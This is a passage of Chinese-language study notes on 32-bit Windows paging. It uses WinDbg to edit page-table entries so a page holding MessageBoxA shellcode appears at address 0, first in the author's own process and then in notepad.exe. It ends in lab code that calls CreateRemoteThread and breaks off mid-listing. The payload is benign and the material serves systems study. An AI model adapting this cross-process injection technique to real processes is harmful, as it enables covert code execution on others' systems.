class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 10_16_HangingPage(挂页).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> * x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> * mem = (<span class="type">int</span>*)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\r\n&quot;</span>, mem);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">*x = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, *mem);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在本进程中的0地址上执行shellcode"><a href="#在本进程中的0地址上执行shellcode" class="headerlink" title="在本进程中的0地址上执行shellcode"></a>在本进程中的0地址上执行shellcode</h3><blockquote><ol><li>拆地址<br>2f0000 &#x3D;&gt; 0000 0000 00 | 10 1111 0000 | 0000 0000 0000<br>0000 0000 0000 &#x3D;&gt; 0<br>0010 1111 0000 &#x3D;&gt; 2f0<br>0000 0000 0000 &#x3D;&gt; 0</li></ol></blockquote><blockquote><ol start="2"><li>WinDBG中设置<br>PTE: 0a512867</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !dd <span class="number">20f</span>6a000        <span class="comment">// 根据进程CR3获取PDE</span></span><br><span class="line">#<span class="number">20f</span>6a000 <span class="number">38736867</span> <span class="number">03</span>c45867 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">20f</span>6a010 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">20f</span>6a020 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">20f</span>6a030 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">20f</span>6a040 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">20f</span>6a050 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">20f</span>6a060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">20f</span>6a070 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">38736000</span>+<span class="number">2f</span>0*<span class="number">4</span>      <span class="comment">// 获取PTE</span></span><br><span class="line">#<span class="number">38736b</span>c0 <span class="number">0</span>a512867 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736b</span>d0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736b</span>e0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736b</span>f0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736</span>c00 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736</span>c10 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736</span>c20 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736</span>c30 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !db <span class="number">0</span>a512000            <span class="comment">// 查看数据</span></span><br><span class="line"># a512000 <span class="number">6</span>a <span class="number">00</span> <span class="number">6</span>a <span class="number">00</span> <span class="number">6</span>a <span class="number">00</span> <span class="number">6</span>a <span class="number">00</span>-b8 b1 ed da <span class="number">75</span> ff d0 c3 j.j.j.j.....u...</span><br><span class="line"># a512010 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># a512020 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># a512030 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># a512040 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># a512050 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># a512060 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># a512070 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line">kd&gt; !dd <span class="number">38736000</span>            <span class="comment">// 查看0地址</span></span><br><span class="line">#<span class="number">38736000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736010</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736020</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736030</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736040</span> <span class="number">0</span>c350847 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736050</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736060</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">38736070</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !ed <span class="number">38736000</span> <span class="number">0</span>a512867       <span class="comment">// 将PTE（0a512867）挂到0地址上</span></span><br></pre></td></tr></table></figure><blockquote><ol start="3"><li>实验代码</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 10_16_HangingPage(挂页).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(__stdcall * FuncProc)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> * mem = (<span class="type">int</span>*)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">FuncProc func = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bufcode[] = </span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,<span class="comment">// push 0</span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,<span class="comment">// push 0</span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,<span class="comment">// push 0</span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,<span class="comment">// push 0</span></span><br><span class="line"><span class="number">0xb8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="comment">// mov eax, 0x12345678</span></span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xd0</span>,<span class="comment">// call eax</span></span><br><span class="line"><span class="number">0xc3</span>,<span class="comment">// ret</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">*(<span class="type">int</span>*)&amp;bufcode[<span class="number">9</span>] = (ULONG)MessageBoxA;</span><br><span class="line"><span class="built_in">memcpy</span>(mem, bufcode, <span class="built_in">sizeof</span>(bufcode));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\r\n&quot;</span>, mem);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// FuncProc func = (FuncProc)mem;</span></span><br><span class="line"><span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, *mem);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="将物理页挂到其他进程并执行shellcode"><a href="#将物理页挂到其他进程并执行shellcode" class="headerlink" title="将物理页挂到其他进程并执行shellcode"></a>将物理页挂到其他进程并执行shellcode</h3><div class="note red bug"><p><strong>注意</strong></p><ul><li>该实验无法在cheatengine-i386.exe（CE）上成功复现, 在notepad.exe上成功复现;</li></ul></div><blockquote><ol><li>拆地址<br>180000 &#x3D;&gt; 0000 0000 00 | 01 1000 0000 | 0000 0000 0000<br>0000 0000 0000 &#x3D;&gt; 0<br>0001 1000 0000 &#x3D;&gt; 180<br>0000 0000 0000 &#x3D;&gt; 0</li></ol></blockquote><blockquote><ol start="2"><li>WinDBG中设置</li></ol></blockquote><ul><li>notepad.exe进程信息<br>PROCESS 87460570  SessionId: 1  Cid: 0978    Peb: 7ffda000  ParentCid: 0a48<br>  DirBase: 015de000  ObjectTable: b3a87c30  HandleCount:  60.<br>  Image: notepad.exe</li><li>实验进程信息<br>PROCESS 87620030  SessionId: 1  Cid: 03f8    Peb: 7ffdc000  ParentCid: 060c<br>  DirBase: 03005000  ObjectTable: a4d11110  HandleCount:  19.<br>  Image: 10_16_HangingPage(¹ÒÒ³).exe</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !dd <span class="number">03005000</span>            <span class="comment">// 首先通过本进程的CR3获取PDE</span></span><br><span class="line"># <span class="number">3005000</span> <span class="number">22</span>edd867 <span class="number">1f</span>d2e867 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">3005010</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">3005020</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">3005030</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">3005040</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">3005050</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">3005060</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">3005070</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">22</span>edd000+<span class="number">180</span>*<span class="number">4</span>      <span class="comment">// 获取本进程的PTE</span></span><br><span class="line">#<span class="number">22</span>edd600 <span class="number">27e84867</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">22</span>edd610 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">22</span>edd620 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">22</span>edd630 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">22</span>edd640 <span class="number">39944005</span> <span class="number">381</span>d4867 <span class="number">1f</span>dd5867 <span class="number">021</span>d6867</span><br><span class="line">#<span class="number">22</span>edd650 <span class="number">36457867</span> <span class="number">29b</span>d8867 <span class="number">1</span>d119867 <span class="number">22b</span>1a867</span><br><span class="line">#<span class="number">22</span>edd660 <span class="number">3175</span>c867 <span class="number">30</span>d5d867 <span class="number">2e620867</span> <span class="number">291</span>a1867</span><br><span class="line">#<span class="number">22</span>edd670 <span class="number">29f</span>21867 <span class="number">14</span>a62867 <span class="number">253e2867</span> <span class="number">03</span>c23867</span><br><span class="line">kd&gt; !db <span class="number">27e84000</span>            <span class="comment">// 查看数据</span></span><br><span class="line">#<span class="number">27e84000</span> <span class="number">6</span>a <span class="number">00</span> <span class="number">6</span>a <span class="number">00</span> <span class="number">6</span>a <span class="number">00</span> <span class="number">6</span>a <span class="number">00</span>-b8 b1 ed da <span class="number">75</span> ff d0 c3 j.j.j.j.....u...</span><br><span class="line">#<span class="number">27e84010</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line">#<span class="number">27e84020</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line">#<span class="number">27e84030</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line">#<span class="number">27e84040</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line">#<span class="number">27e84050</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line">#<span class="number">27e84060</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line">#<span class="number">27e84070</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line">kd&gt; !dd <span class="number">015</span>de000            <span class="comment">// 通过notepad.exe的CR3获取PDE</span></span><br><span class="line"># <span class="number">15</span>de000 <span class="number">3b</span>822867 <span class="number">37</span>a23867 <span class="number">0</span>c64e867 <span class="number">07f</span>55867</span><br><span class="line"># <span class="number">15</span>de010 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">29f</span>af867</span><br><span class="line"># <span class="number">15</span>de020 <span class="number">285b</span>3867 <span class="number">38</span>cf1867 <span class="number">023f</span>5867 <span class="number">04737867</span></span><br><span class="line"># <span class="number">15</span>de030 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">15</span>de040 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">15</span>de050 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">15</span>de060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">15</span>de070 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">3b</span>822000            <span class="comment">// 查看notepad.exe的PTE</span></span><br><span class="line">#<span class="number">3b</span>822000 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">3b</span>822010 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">3b</span>822020 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">3b</span>822030 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">3b</span>822040 <span class="number">321f</span>8847 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">3b</span>822050 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">3b</span>822060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">3b</span>822070 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !ed <span class="number">3b</span>822000 <span class="number">27e84867</span>       <span class="comment">// 将进程的PTE挂到notepad.exe的0地址上</span></span><br></pre></td></tr></table></figure><blockquote><ol start="3"><li>实验代码</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 10_16_HangingPage(挂页).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(__stdcall * FuncProc)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> * mem = (<span class="type">int</span>*)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">FuncProc func = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bufcode[] = </span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,<span class="comment">// push 0</span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,<span class="comment">// push 0</span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,<span class="comment">// push 0</span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,<span class="comment">// push 0</span></span><br><span class="line"><span class="number">0xb8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="comment">// mov eax, 0x12345678</span></span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xd0</span>,<span class="comment">// call eax</span></span><br><span class="line"><span class="number">0xc3</span>,<span class="comment">// ret</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">*(<span class="type">int</span>*)&amp;bufcode[<span class="number">9</span>] = (ULONG)MessageBoxA;</span><br><span class="line"><span class="built_in">memcpy</span>(mem, bufcode, <span class="built_in">sizeof</span>(bufcode));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\r\n&quot;</span>, mem);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// FuncProc func = (FuncProc)mem;</span></span><br><span class="line"><span class="comment">// func();</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="number">2424</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hProcess)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Failed\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hThread)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread Failed\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span 